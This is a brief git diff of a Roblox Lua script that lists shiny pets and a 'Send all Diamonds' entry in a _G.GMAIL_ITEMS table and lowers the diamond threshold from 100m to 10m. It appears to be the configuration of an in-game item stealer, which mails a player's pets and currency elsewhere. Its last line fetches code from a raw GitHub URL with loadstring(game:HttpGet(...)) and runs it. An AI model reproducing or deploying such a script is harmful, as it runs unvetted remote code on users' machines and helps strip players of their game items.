@@ -34,6 +34,6 @@ _G.GMAIL_ITEMS = {
   ["Shiny Normal Wild Galaxy Agony"] = {Class = "Pet", Id = "Wild Galaxy Agony", MinAmount = 1, IsShiny = true},
   ["Shiny Golden Wild Galaxy Agony"] = {Class = "Pet", Id = "Wild Galaxy Agony", MinAmount = 1, IsGold = true, IsShiny = true},
   ["Shiny RB Wild Galaxy Agony"] = {Class = "Pet", Id = "Wild Galaxy Agony", MinAmount = 1, IsRainbow = true, IsShiny = true},
-  ["Send all Diamonds"] = {Class = "Currency", Id = "Diamonds", MinAmount = "100m"},
+  ["Send all Diamonds"] = {Class = "Currency", Id = "Diamonds", MinAmount = "10m"},
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sxdasfvas/test/main/gscripts.lua"))()
